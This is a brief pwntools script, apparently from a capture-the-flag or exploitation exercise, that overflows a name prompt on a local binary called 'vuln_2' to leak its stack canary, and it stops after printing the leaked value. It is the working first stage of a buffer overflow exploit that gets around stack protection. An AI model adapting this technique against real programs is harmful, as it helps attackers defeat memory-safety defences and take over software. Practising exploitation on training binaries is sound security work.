from pwn import *

elf = context.binary = ELF('./vuln_2')
io = process()

# first, we need to leak the stack cookie
payload = b"A" * 265

io.sendafter(b"Hey, whats your name!?\n", payload)
io.recvuntil(b"Welcome \n" + payload)

# the next 7 bytes will be part of the stack canary
leak_canary = u64( b"\x00" + io.recv(7) )

info(f"stack canary: {hex(leak_canary)}")